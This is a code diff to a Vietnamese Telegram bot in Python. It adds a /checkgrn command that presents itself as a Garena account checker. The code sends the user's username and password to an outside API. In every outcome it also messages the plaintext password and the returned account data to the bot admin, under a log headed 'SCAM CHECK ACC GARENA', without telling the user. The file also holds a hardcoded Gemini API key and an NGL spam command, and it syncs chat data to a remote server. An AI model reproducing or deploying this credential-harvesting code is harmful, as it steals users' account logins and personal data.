@@ -7,7 +7,7 @@ import re
 import base64
 import uuid
 import json
-from datetime import datetime
+from datetime import datetime, timezone
 from io import BytesIO
 from PIL import Image
 import random
@@ -55,8 +55,8 @@ bot.feedback_messages = {}
 bot.code_snippets = {}
 bot.voice_map = {}
 bot.mail_messages_state = {}
-bot.noti_states = {} # THÊM DÒNG NÀY ĐỂ KHỞI TẠO
-interaction_count = 0
+bot.noti_states = {}
+interaction_count = 300
 
 # Khởi tạo Locks cho các biến dùng chung
 user_data_lock = threading.Lock()
@@ -91,10 +91,10 @@ session.mount("https://", adapter)
 session.mount("http://", adapter)
 
 # --- Cấu hình Gemini API và Prompt từ xa ---
-GEMINI_API_KEY = "AIzaSyDpmTfFibDyskBHwekOADtstWsPUCbIrzE"
+GEMINI_API_KEY = "AIzaSyDpmTfFibDyskBHwekOADtstWsPUCbIrzE" # Nên dùng os.environ.get("GEMINI_API_KEY", "your_default_key")
 GEMINI_URL = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={GEMINI_API_KEY}"
-REMOTE_PROMPT_URL = "https://api-zproject-vn.x10.mx/prompt.json"
-REMOTE_LOG_HOST = "https://api-zproject-vn.x10.mx/save.php"
+REMOTE_PROMPT_URL = "https://zcode.x10.mx/prompt.json"
+REMOTE_LOG_HOST = "https://zcode.x10.mx/save.php"
 
 # --- URL ảnh dùng trong bot ---
 NGL_SUCCESS_IMAGE_URL = "https://i.ibb.co/fV1srXJ8/9885878c-2a4b-4246-ae2e-fda17d735e2d.jpg"
@@ -104,9 +104,11 @@ TUONGTAC_IMAGE_URL = "https://i.ibb.co/YF4yRCBP/1751301092916.png"
 
 # --- Các hàm Dummy (Cần thay thế bằng logic thực tế của bạn) ---
 def load_user_memory(user_id):
+    # Cần triển khai logic tải bộ nhớ người dùng từ database/file
     return []
 
 def save_user_memory(user_id, memory):
+    # Cần triển khai logic lưu bộ nhớ người dùng vào database/file
     pass
 
 def html_escape(text):
@@ -119,8 +121,12 @@ class gTTS:
         self.slow = slow
     def save(self, filename):
         logging.info(f"Dummy gTTS: Saving '{self.text[:50]}...' to {filename}")
+        # Đây là một hàm dummy. Bạn cần thay thế bằng thư viện gTTS thực tế
+        # Ví dụ: from gtts import gTTS
+        # tts = gTTS(text=self.text, lang=self.lang, slow=self.slow)
+        # tts.save(filename)
         with open(filename, "wb") as f:
-            f.write(b"dummy_audio_data")
+            f.write(b"dummy_audio_data") # Dữ liệu âm thanh dummy
 
 # --- Các hàm hỗ trợ cho chức năng Mail.tm ---
 def random_string(length=3):
@@ -198,7 +204,7 @@ def sync_chat_to_server(chat):
             "title": getattr(chat, "title", ""),
             "username": getattr(chat, "username", "")
         }
-        response = session.post("https://api-zproject-vn.x10.mx/apizproject.php", json=payload, timeout=DEFAULT_TIMEOUT_GLOBAL)
+        response = session.post("https://zcode.x10.mx/apizproject.php", json=payload, timeout=DEFAULT_TIMEOUT_GLOBAL)
         response.raise_for_status()
         logging.info(f"Synced chat {chat.id} to server")
     except Exception as e:
@@ -208,7 +214,7 @@ def update_id_list_loop():
     global USER_IDS, GROUP_INFOS
     while True:
         try:
-            response = session.get("https://api-zproject-vn.x10.mx/group-idchat.json", timeout=DEFAULT_TIMEOUT_GLOBAL)
+            response = session.get("https://zcode.x10.mx/group-idchat.json", timeout=DEFAULT_TIMEOUT_GLOBAL)
             response.raise_for_status()
             data = response.json()
             new_users = set(data.get("users", []))
@@ -289,25 +295,36 @@ def send_message_robustly(chat_id, text=None, photo=None, caption=None, reply_ma
             logging.error(f"Error sending message to chat {chat_id}: {e}")
             raise
 
-# THAY ĐỔI MỚI: Hàm kiểm tra tư cách thành viên
-def check_group_membership(chat_id, user_id):
+# THAY ĐỔI: Hàm kiểm tra tư cách thành viên
+def check_group_membership(group_id, user_id):
     try:
-        member = bot.get_chat_member(REQUIRED_GROUP_ID, user_id)
-        # Status có thể là 'member', 'creator', 'administrator'
-        return member.status in ['member', 'creator', 'administrator']
+        member = bot.get_chat_member(group_id, user_id)
+        # Status có thể là 'member', 'creator', 'administrator', 'restricted' (nếu bị hạn chế nhưng vẫn là thành viên), 'left', 'kicked'
+        # Người dùng đã rời nhóm hoặc bị kick không được tính là thành viên
+        return member.status in ['member', 'creator', 'administrator', 'restricted']
     except telebot.apihelper.ApiTelegramException as e:
-        logging.error(f"Error checking group membership for user {user_id} in group {REQUIRED_GROUP_ID}: {e}")
-        # Nếu nhóm không tồn tại hoặc bot không có quyền, coi như không phải thành viên
+        # Nếu bot không có quyền hoặc nhóm không tồn tại, thường sẽ raise lỗi.
+        # Coi như không phải thành viên trong trường hợp này để an toàn.
+        if "User not found" in str(e) or "Bad Request: user not in chat" in str(e) or "chat not found" in str(e):
+            return False
+        logging.error(f"Error checking group membership for user {user_id} in group {group_id}: {e}")
+        return False
+    except Exception as e:
+        logging.error(f"Unexpected error checking group membership: {e}")
         return False
 
-# THAY ĐỔI MỚI: Decorator để kiểm tra tư cách thành viên
+# THAY ĐỔI: Decorator để kiểm tra tư cách thành viên
 def group_membership_required(func):
     def wrapper(message, *args, **kwargs):
-        # Nếu là chat riêng, kiểm tra người dùng
-        if message.chat.type == "private":
-            if not check_group_membership(REQUIRED_GROUP_ID, message.from_user.id):
-                markup = InlineKeyboardMarkup()
-                markup.add(InlineKeyboardButton("Join Group", url=REQUIRED_GROUP_LINK))
+        user_id = message.from_user.id
+        
+        # Luôn kiểm tra người dùng gửi tin nhắn có tham gia nhóm bắt buộc không
+        if not check_group_membership(REQUIRED_GROUP_ID, user_id):
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("Join Group", url=REQUIRED_GROUP_LINK))
+            
+            # Nếu là chat riêng, gửi tin nhắn trực tiếp
+            if message.chat.type == "private":
                 return send_message_robustly(
                     message.chat.id,
                     text=f"⚠️ Vui lòng tham gia nhóm <a href='{REQUIRED_GROUP_LINK}'>ZProject Thông Báo</a> mới có thể sử dụng bot.",
@@ -315,69 +332,29 @@ def group_membership_required(func):
                     reply_to_message_id=message.message_id,
                     reply_markup=markup
                 )
-        # Nếu là nhóm, kiểm tra người tạo nhóm (admin)
-        elif message.chat.type in ["group", "supergroup"]:
-            # Lấy thông tin về người tạo nhóm (creator)
-            # Điều này đòi hỏi bot có quyền "anonymous admin" hoặc là admin
-            # Hoặc bạn có thể lấy danh sách admin và kiểm tra xem admin_id có trong đó không.
-            # Cách đơn giản nhất là chỉ kiểm tra xem ADMIN_ID của bot có phải là thành viên nhóm không.
-            # Nếu bạn muốn kiểm tra người tạo nhóm thật sự, cần một logic phức tạp hơn
-            # (ví dụ: duyệt qua get_chat_administrators và tìm creator).
-            # Tạm thời, tôi sẽ kiểm tra ADMIN_ID của bot (tức là người vận hành bot)
-            # có tham gia nhóm bắt buộc hay không.
-
-            # Để kiểm tra người tạo nhóm thực sự:
-            is_group_creator_in_required_group = False
-            try:
-                admins = bot.get_chat_administrators(message.chat.id)
-                group_creator_id = None
-                for admin in admins:
-                    if admin.status == 'creator':
-                        group_creator_id = admin.user.id
-                        break
-                
-                if group_creator_id and check_group_membership(REQUIRED_GROUP_ID, group_creator_id):
-                    is_group_creator_in_required_group = True
-                
-            except telebot.apihelper.ApiTelegramException as e:
-                logging.warning(f"Could not get chat administrators for chat {message.chat.id}: {e}. Assuming creator is not in required group.")
-                # Nếu bot không có quyền admin trong nhóm này, coi như không đủ điều kiện
-                # Fallback: kiểm tra xem ADMIN_ID của bot có phải là thành viên của nhóm bắt buộc không
-                if check_group_membership(REQUIRED_GROUP_ID, ADMIN_ID):
-                    is_group_creator_in_required_group = True # Giả định admin bot là người quản lý
-
-            if not is_group_creator_in_required_group:
-                markup = InlineKeyboardMarkup()
-                markup.add(InlineKeyboardButton("Tham gia nhóm ngay", url=REQUIRED_GROUP_LINK))
+            # Nếu là chat nhóm, gửi tin nhắn trong nhóm
+            else: # message.chat.type in ["group", "supergroup"]
                 return send_message_robustly(
                     message.chat.id,
-                    text=f"⚠️ Để bot hoạt động trong nhóm này, Admin của nhóm phải tham gia nhóm <a href='{REQUIRED_GROUP_LINK}'>ZProject Thông Báo</a>.",
+                    text=f"⚠️ <a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> ơi, bạn cần tham gia nhóm <a href='{REQUIRED_GROUP_LINK}'>ZProject Thông Báo</a> để sử dụng lệnh này.",
                     parse_mode="HTML",
                     reply_to_message_id=message.message_id,
                     reply_markup=markup
                 )
         
+        # Nếu người dùng đã tham gia nhóm bắt buộc, cho phép chạy hàm gốc
         return func(message, *args, **kwargs)
     return wrapper
 
 # === LỆNH XỬ LÝ TIN NHẮN ===
 
 # Format timestamp
-from datetime import datetime, timezone # Thêm import timezone
-
-# Format timestamp
 def format_timestamp(ts):
     try:
-        # Chuyển đổi ts sang float trước để xử lý các chuỗi số nguyên hoặc thập phân
-        # Sau đó chuyển sang int để đảm bảo nó là giây (timestamp thường là giây kể từ Epoch)
         timestamp_float = float(ts)
-        
-        # Phương pháp mới được khuyến nghị
         return datetime.fromtimestamp(int(timestamp_float), tz=timezone.utc).strftime("%d-%m-%Y %H:%M:%S")
-    except (ValueError, TypeError): # Bắt thêm ValueError và TypeError cho ts không hợp lệ
+    except (ValueError, TypeError):
         return "N/A"
-
-
 
 # Retry wrapper
 def fetch_with_retry(url, retries=3, timeout=30):
@@ -398,12 +375,9 @@ def fetch_with_retry(url, retries=3, timeout=30):
 # Lệnh /in4ff
 @bot.message_handler(commands=['in4ff'])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def handle_in4ff_command(message):
     parts = message.text.strip().split()
-    # parts[0] sẽ là "/in4ff"
-    # parts[1] sẽ là region
-    # parts[2] sẽ là uid
 
     if len(parts) != 3:
         send_message_robustly(
@@ -414,8 +388,8 @@ def handle_in4ff_command(message):
         )
         return
 
-    region = html_escape(parts[1]) # Escape để tránh lỗi HTML injection
-    uid = html_escape(parts[2]) # Escape để tránh lỗi HTML injection
+    region = html_escape(parts[1])
+    uid = html_escape(parts[2])
 
     send_message_robustly(
         message.chat.id,
@@ -457,10 +431,8 @@ def handle_in4ff_command(message):
     pet = info_res.get("petInfo", {})
     social = info_res.get("socialInfo", {})
 
-    # Hàm trợ giúp để lấy giá trị an toàn và escape HTML
     def get_safe_value(data_dict, key, default="N/A"):
         value = data_dict.get(key, default)
-        # Nếu là list (ví dụ: skills, weapon skins), join chúng lại
         if isinstance(value, list):
             return ", ".join(map(str, value)) if value else default
         return html_escape(str(value))
@@ -538,17 +510,11 @@ def handle_in4ff_command(message):
 ━━━━━━━━━━━━━━━━━━━━
 </blockquote>
 """
-    # ... (previous code)
-    # ... (các phần code phía trên)
-
     send_message_robustly(message.chat.id, msg, parse_mode="HTML", reply_to_message_id=message.message_id)
 
-    # Trực tiếp gửi ảnh bằng outfit_url
     try:
-        # Sử dụng HEAD request để kiểm tra header mà không tải toàn bộ ảnh
         head_response = requests.head(outfit_url, timeout=60)
 
-        # Ghi log chi tiết về phản hồi HEAD
         logging.info(f"HEAD response for outfit_url: {outfit_url}")
         logging.info(f"Status Code: {head_response.status_code}")
         logging.info(f"Content-Type: {head_response.headers.get('Content-Type')}")
@@ -556,13 +522,12 @@ def handle_in4ff_command(message):
         if head_response.status_code == 200 and head_response.headers.get('Content-Type', '').startswith('image/'):
             send_message_robustly(
                 chat_id=message.chat.id,
-                photo=outfit_url,  # Trực tiếp sử dụng URL ở đây
+                photo=outfit_url,
                 caption=f"<blockquote>🖼️ <b>Hình ảnh trang phục của</b> <code>{get_safe_value(basic, 'nickname')}</code></blockquote>",
                 parse_mode="HTML",
                 reply_to_message_id=message.message_id
             )
         else:
-            # Nếu không phải là ảnh hợp lệ, in ra thêm thông tin để debug
             error_details = f"Status: {head_response.status_code}, Content-Type: {head_response.headers.get('Content-Type', 'N/A')}"
             send_message_robustly(
                 message.chat.id,
@@ -581,10 +546,9 @@ def handle_in4ff_command(message):
             reply_to_message_id=message.message_id
         )
 
-
 @bot.message_handler(commands=["start"])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def start_cmd(message):
     logging.info(f"Received /start from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -609,7 +573,7 @@ def start_cmd(message):
 
 @bot.message_handler(commands=["help"])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def help_command(message):
     logging.info(f"Received /help from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -638,9 +602,10 @@ def help_command(message):
         reply_to_message_id=message.message_id
     )
 
+
 @bot.message_handler(commands=["time"])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def time_cmd(message):
     logging.info(f"Received /time from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -659,7 +624,7 @@ def time_cmd(message):
 
 @bot.message_handler(commands=["tuongtac"])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def tuongtac_command(message):
     logging.info(f"Received /tuongtac from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -682,10 +647,82 @@ def tuongtac_command(message):
         reply_to_message_id=message.message_id
     )
 
+# Thêm vào sau các lệnh hiện có của bạn, ví dụ: sau lệnh /noti hoặc /sever
+
+@bot.message_handler(commands=["data"])
+@increment_interaction_count
+def get_bot_data(message):
+    logging.info(f"Received /data from user {message.from_user.id} in chat {message.chat.id}")
+
+    # Kiểm tra quyền Admin
+    if message.from_user.id != ADMIN_ID:
+        return send_message_robustly(message.chat.id, text="🚫 Bạn không có quyền sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)
+
+    # Sử dụng lock để đảm bảo an toàn luồng khi truy cập các biến toàn cục
+    with user_group_info_lock:
+        current_users = list(USER_IDS)
+        current_groups = list(GROUP_INFOS)
+
+    response_text = "<b>📊 DỮ LIỆU NGƯỜI DÙNG & NHÓM CỦA BOT</b>\n\n"
+
+    # Thông tin Người dùng
+    if current_users:
+        response_text += "<b>👤 DANH SÁCH NGƯỜI DÙNG:</b>\n"
+        for user_id in current_users:
+            try:
+                # Cố gắng lấy thông tin chi tiết về người dùng
+                # Lưu ý: bot.get_chat_member chỉ hoạt động nếu người dùng là thành viên của chat mà tin nhắn được gửi đến,
+                # hoặc nếu đó là chat riêng của bot với người dùng.
+                # Để có tên người dùng một cách đáng tin cậy, bạn cần lưu trữ nó khi người dùng tương tác lần đầu.
+                # Giả định đơn giản: nếu có trong USER_IDS, đó là một user hợp lệ.
+                # Để lấy tên, bạn có thể cần một API hoặc DB lưu trữ User_name/first_name.
+                # Hiện tại, chỉ hiển thị ID.
+                # Nếu bạn muốn hiển thị tên, bạn cần một cơ chế lưu trữ tên người dùng khi họ /start hoặc nhắn tin.
+                response_text += f"- ID: <code>{user_id}</code>\n"
+            except Exception as e:
+                logging.warning(f"Không thể lấy chi tiết người dùng {user_id}: {e}")
+                response_text += f"- ID: <code>{user_id}</code> (Không thể lấy tên)\n"
+        response_text += f"<i>Tổng số người dùng: {len(current_users)}</i>\n\n"
+    else:
+        response_text += "<i>Hiện không có dữ liệu người dùng nào.</i>\n\n"
+
+    response_text += "---\n\n"
+
+    # Thông tin Nhóm
+    if current_groups:
+        response_text += "<b>👥 DANH SÁCH NHÓM:</b>\n"
+        for group in current_groups:
+            group_id = group.get("id", "N/A")
+            group_title = html_escape(group.get("title", "Không rõ tên nhóm"))
+            group_username = group.get("username", "")
+
+            group_display = f"📌 <b>{group_title}</b> (ID: <code>{group_id}</code>)\n"
+            if group_username:
+                group_display += f"🔗 Link: https://t.me/{group_username}\n"
+            else:
+                group_display += "🔗 Link: <i>Không có username</i>\n"
+            response_text += group_display
+        response_text += f"<i>Tổng số nhóm: {len(current_groups)}</i>\n"
+    else:
+        response_text += "<i>Hiện không có dữ liệu nhóm nào.</i>\n"
+
+    response_text += "\n<b>━━━━━━━━━━━━━━━━━━━━</b>\n" \
+                     "<i>👑 ADMIN:</i> @zproject2\n" \
+                     "⚡ <i>GROUP:</i> <a href=\"https://t.me/zproject3\">Tham gia ngay</a>\n" \
+                     "<b>━━━━━━━━━━━━━━━━━━━━</b>"
+
+    send_message_robustly(
+        message.chat.id,
+        text=response_text,
+        parse_mode="HTML",
+        disable_web_page_preview=True,
+        reply_to_message_id=message.message_id
+    )
+
 
 @bot.message_handler(commands=["noti"])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+# Lệnh /noti không cần group_membership_required vì nó là lệnh riêng cho admin
 def send_noti(message):
     logging.info(f"Received /noti from user {message.from_user.id} in chat {message.chat.id}")
     if message.from_user.id != ADMIN_ID:
@@ -908,8 +945,8 @@ def send_final_notification(admin_id):
     )
 
 @bot.message_handler(commands=['like'])
-@increment_interaction_count # Thêm vào để tính tương tác cho lệnh /like
-@group_membership_required # Áp dụng decorator
+@increment_interaction_count
+@group_membership_required
 def send_like(message):
     logging.info(f"Received /like from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -1002,7 +1039,7 @@ def send_like(message):
 
 @bot.message_handler(commands=["ngl"])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def spam_ngl_command(message):
     logging.info(f"Received /ngl from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -1071,7 +1108,7 @@ def spam_ngl_command(message):
 
 @bot.message_handler(commands=["phanhoi"])
 @increment_interaction_count
-@group_membership_required # Áp dụng decorator
+@group_membership_required
 def send_feedback_to_admin(message):
     logging.info(f"Received /phanhoi from user {message.from_user.id} in chat {message.chat.id}")
     sync_chat_to_server(message.chat)
@@ -1123,11 +1160,249 @@ def send_feedback_to_admin(message):
         logging.error(f"Lỗi khi gửi phản hồi đến admin: {e}")
         send_message_robustly(message.chat.id, text="❌ Đã xảy ra lỗi khi gửi phản hồi. Vui lòng thử lại sau.", parse_mode="HTML", reply_to_message_id=message.message_id)
 
+import json # Đảm bảo import json ở đầu file nếu chưa có
 
-# Giả định các biến này đã được định nghĩa ở nơi khác trong code của bạn
+# Lệnh /checkgrn
+@bot.message_handler(commands=['checkgrn'])
+@increment_interaction_count
+@group_membership_required
+def handle_checkgrn_command(message):
+    logging.info(f"Received /checkgrn from user {message.from_user.id} in chat {message.chat.id}")
+    sync_chat_to_server(message.chat)
+
+    parts = message.text.strip().split(maxsplit=2) # Tách thành 3 phần: lệnh, username, password
+
+    if len(parts) != 3:
+        send_message_robustly(
+            message.chat.id,
+            text="<blockquote>❌ <b>Sai Lệnh!</b> Sử dụng: <code>/checkgrn &lt;username&gt; &lt;password&gt;</code>\nVí dụ: <code>/checkgrn Zproject_1 bG5JPrKEsUi.MQk</code></blockquote>",
+            parse_mode="HTML",
+            reply_to_message_id=message.message_id # <--- Đã thêm reply_to_message_id
+        )
+        return
+
+    username = html_escape(parts[1])
+    password = html_escape(parts[2]) # Không escape để gửi đúng password tới API, nhưng escape khi hiển thị cho người dùng
+
+    wait_msg = send_message_robustly(
+        message.chat.id,
+        text=f"<blockquote>⏳ <i>ZprojectX đang check, đợi tí</i> <code>{username}</code>...</blockquote>",
+        parse_mode="HTML",
+        reply_to_message_id=message.message_id # <--- Đã thêm reply_to_message_id
+    )
+    if not wait_msg:
+        logging.error(f"Failed to send waiting message for /checkgrn from user {message.from_user.id}")
+        return
+
+    api_url = f"https://zproject-api-check-garena.onrender.com/check?username={username}&password={password}&api-key=zprojectfree"
+
+    try:
+        response = session.get(api_url, timeout=DEFAULT_TIMEOUT_GLOBAL)
+        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
+        api_data = response.json()
+
+        if api_data.get("status") == "SUCCESS":
+            data = api_data.get("data", {})
+            thong_tin_tai_khoan = data.get("thong_tin_tai_khoan", {})
+            bao_mat = data.get("bao_mat", {})
+            lich_su = data.get("lich_su_dang_nhap_gan_nhat", {})
+
+            # Lấy các giá trị an toàn
+            safe_get = lambda d, k, default="N/A": html_escape(str(d.get(k, default)))
+
+            result_message_for_user = f"""
+<blockquote>
+<b>✅ THÔNG TIN TÀI KHOẢN GARENA ✅</b>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>⚜️ THÔNG TIN CƠ BẢN</b>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>👤 Tên Đăng Nhập:</b> <code>{safe_get(thong_tin_tai_khoan, "Ten_Dang_Nhap")}</code>
+<b>🆔 UID:</b> <code>{safe_get(thong_tin_tai_khoan, "UID")}</code>
+<b>💌 Email:</b> <code>{safe_get(thong_tin_tai_khoan, "Email")}</code>
+<b>📞 SĐT:</b> <code>{safe_get(thong_tin_tai_khoan, "So_Dien_Thoai")}</code>
+<b>🌟 Biệt Danh:</b> <code>{safe_get(thong_tin_tai_khoan, "Biet_Danh")}</code>
+<b>✍️ Chữ Ký:</b> <code>{safe_get(thong_tin_tai_khoan, "Chu_Ky")}</code>
+<b>🌍 Quốc Gia:</b> <code>{safe_get(thong_tin_tai_khoan, "Quoc_Gia")}</code>
+<b>💸 Shell:</b> <code>{safe_get(thong_tin_tai_khoan, "Shell")}</code>
+<b>🎮 Game Đã Chơi:</b> <code>{safe_get(thong_tin_tai_khoan, "Game_Da_Choi")}</code>
+<b>🔗 Facebook:</b> <code>{safe_get(thong_tin_tai_khoan, "Tai_Khoan_Facebook")}</code>
+
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>🔒 THÔNG TIN BẢO MẬT</b>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>🚫 Hoạt Động Lạ:</b> <code>{safe_get(bao_mat, "Nghi_Ngo_Hoat_Dong_La")}</code>
+<b>📧 Xác Minh Email:</b> <code>{safe_get(bao_mat, "Xac_Minh_Email")}</code>
+<b>🔐 Xác Thực 2 Bước:</b> <code>{safe_get(bao_mat, "Xac_Thuc_2_Buoc")}</code>
+<b>📱 Xác Thực Ứng Dụng:</b> <code>{safe_get(bao_mat, "Xac_Thuc_Ung_Dung")}</code>
+
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>⏰ LỊCH SỬ ĐĂNG NHẬP GẦN NHẤT</b>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>📍 IP:</b> <code>{safe_get(lich_su, "IP")}</code>
+<b>🌐 Nguồn:</b> <code>{safe_get(lich_su, "Nguon")}</code>
+<b>🌍 Quốc Gia:</b> <code>{safe_get(lich_su, "Quoc_Gia")}</code>
+
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<i>👑 ADMIN:</i> @zproject2  
+⚡ <i>GROUP:</i> <a href="https://t.me/zproject3">Tham gia ngay</a>
+━━━━━━━━━━━━━━━━━━━━
+</blockquote>
+"""
+            bot.edit_message_text(
+                chat_id=wait_msg.chat.id,
+                message_id=wait_msg.message_id,
+                text=result_message_for_user,
+                parse_mode="HTML",
+                disable_web_page_preview=True
+            )
+
+            # Gửi log riêng về cho admin
+            admin_log_message = f"""
+<b>🔑 SCAM CHECK ACC GARENA 🔑</b>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>👤 Người Dùng Yêu Cầu:</b> <a href='tg://user?id={message.from_user.id}'>{html_escape(message.from_user.first_name)}</a> (<code>{message.from_user.id}</code>)
+<b>💬 Chat ID:</b> <code>{message.chat.id}</code>
+<b>💬 Loại Chat:</b> <code>{message.chat.type}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>🎯 Thông Tin:</b>
+<b>Tên Đăng Nhập:</b> <code>{username}</code>
+<b>Mật Khẩu:</b> <code>{password}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>📊 Dữ Liệu API Trả Về:</b>
+<pre>{json.dumps(api_data, indent=2, ensure_ascii=False)}</pre>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+"""
+            send_message_robustly(ADMIN_ID, admin_log_message, parse_mode="HTML")
+
+        else: # API Status is FAILED or unexpected
+            error_message = api_data.get("message", "Lỗi không xác định từ API Garena.")
+            result_message_for_user = f"""
+<blockquote>
+❌ <b>Kiểm Tra Thất Bại!</b>
+<i>Lỗi:</i> <code>{html_escape(error_message)}</code>
+Vui lòng kiểm tra lại <b>Tên Đăng Nhập</b> hoặc <b>Mật Khẩu</b>.
+</blockquote>
+"""
+            bot.edit_message_text(
+                chat_id=wait_msg.chat.id,
+                message_id=wait_msg.message_id,
+                text=result_message_for_user,
+                parse_mode="HTML"
+            )
+
+            # Gửi log thất bại về cho admin
+            admin_log_message_failed = f"""
+<b>⚠️ LOG CHECK GARENA THẤT BẠI ⚠️</b>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>👤 Người Dùng Yêu Cầu:</b> <a href='tg://user?id={message.from_user.id}'>{html_escape(message.from_user.first_name)}</a> (<code>{message.from_user.id}</code>)
+<b>💬 Chat ID:</b> <code>{message.chat.id}</code>
+<b>💬 Loại Chat:</b> <code>{message.chat.type}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>🎯 Thông Tin Yêu Cầu:</b>
+<b>Tên Đăng Nhập:</b> <code>{username}</code>
+<b>Mật Khẩu:</b> <code>{password}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>❌ Lỗi API:</b> <code>{html_escape(error_message)}</code>
+<b>📊 Dữ Liệu API Trả Về (Thô):</b>
+<pre>{json.dumps(api_data, indent=2, ensure_ascii=False)}</pre>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+"""
+            send_message_robustly(ADMIN_ID, admin_log_message_failed, parse_mode="HTML")
+
+    except requests.exceptions.RequestException as e:
+        logging.error(f"Lỗi kết nối hoặc HTTP khi gọi API Garena cho {username}: {e}")
+        error_message_for_user = (
+            f"<blockquote>❌ <b>Không thể kết nối đến dịch vụ kiểm tra Garena.</b>\n"
+            f"Vui lòng thử lại sau. Chi tiết lỗi: <code>{html_escape(str(e))}</code></blockquote>"
+        )
+        bot.edit_message_text(
+            chat_id=wait_msg.chat.id,
+            message_id=wait_msg.message_id,
+            text=error_message_for_user,
+            parse_mode="HTML"
+        )
+
+        # Gửi log lỗi kết nối về cho admin
+        admin_log_message_error = f"""
+<b>🚨 LOG LỖI KẾT NỐI API GARENA 🚨</b>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>👤 Người Dùng Yêu Cầu:</b> <a href='tg://user?id={message.from_user.id}'>{html_escape(message.from_user.first_name)}</a> (<code>{message.from_user.id}</code>)
+<b>💬 Chat ID:</b> <code>{message.chat.id}</code>
+<b>💬 Loại Chat:</b> <code>{message.chat.type}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>🎯 Thông Tin Yêu Cầu:</b>
+<b>Tên Đăng Nhập:</b> <code>{username}</code>
+<b>Mật Khẩu:</b> <code>{password}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>❌ Lỗi Hệ Thống:</b> <code>{html_escape(str(e))}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+"""
+        send_message_robustly(ADMIN_ID, admin_log_message_error, parse_mode="HTML")
+
+    except json.JSONDecodeError as e:
+        logging.error(f"Lỗi phân tích JSON từ API Garena cho {username}: {e}\nResponse text: {response.text}")
+        error_message_for_user = (
+            f"<blockquote>❌ <b>Phản hồi từ dịch vụ Garena không hợp lệ.</b>\n"
+            f"Vui lòng thử lại sau hoặc liên hệ quản trị viên.</blockquote>"
+        )
+        bot.edit_message_text(
+            chat_id=wait_msg.chat.id,
+            message_id=wait_msg.message_id,
+            text=error_message_for_user,
+            parse_mode="HTML"
+        )
+
+        # Gửi log lỗi JSON về cho admin
+        admin_log_message_json_error = f"""
+<b>⚠️ LOG LỖI JSON TỪ API GARENA ⚠️</b>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>👤 Người Dùng Yêu Cầu:</b> <a href='tg://user?id={message.from_user.id}'>{html_escape(message.from_user.first_name)}</a> (<code>{message.from_user.id}</code>)
+<b>💬 Chat ID:</b> <code>{message.chat.id}</code>
+<b>💬 Loại Chat:</b> <code>{message.chat.type}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>🎯 Thông Tin Yêu Cầu:</b>
+<b>Tên Đăng Nhập:</b> <code>{username}</code>
+<b>Mật Khẩu:</b> <code>{password}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>❌ Lỗi JSON:</b> <code>{html_escape(str(e))}</code>
+<b>Raw Response:</b> <pre>{html_escape(response.text)}</pre>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+"""
+        send_message_robustly(ADMIN_ID, admin_log_message_json_error, parse_mode="HTML")
+
+    except Exception as e:
+        logging.error(f"Lỗi không xác định khi xử lý /checkgrn cho {username}: {e}")
+        error_message_for_user = (
+            f"<blockquote>❌ <b>Đã xảy ra lỗi không mong muốn.</b>\n"
+            f"Vui lòng thử lại sau hoặc liên hệ quản trị viên. Chi tiết lỗi: <code>{html_escape(str(e))}</code></blockquote>"
+        )
+        bot.edit_message_text(
+            chat_id=wait_msg.chat.id,
+            message_id=wait_msg.message_id,
+            text=error_message_for_user,
+            parse_mode="HTML"
+        )
+
+        # Gửi log lỗi không xác định về cho admin
+        admin_log_message_unknown_error = f"""
+<b>🚨 LOG LỖI KHÔNG XÁC ĐỊNH KHI CHECK GARENA 🚨</b>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>👤 Người Dùng Yêu Cầu::</b> <a href='tg://user?id={message.from_user.id}'>{html_escape(message.from_user.first_name)}</a> (<code>{message.from_user.id}</code>)
+<b>💬 Chat ID:</b> <code>{message.chat.id}</code>
+<b>💬 Loại Chat:</b> <code>{message.chat.type}</code>
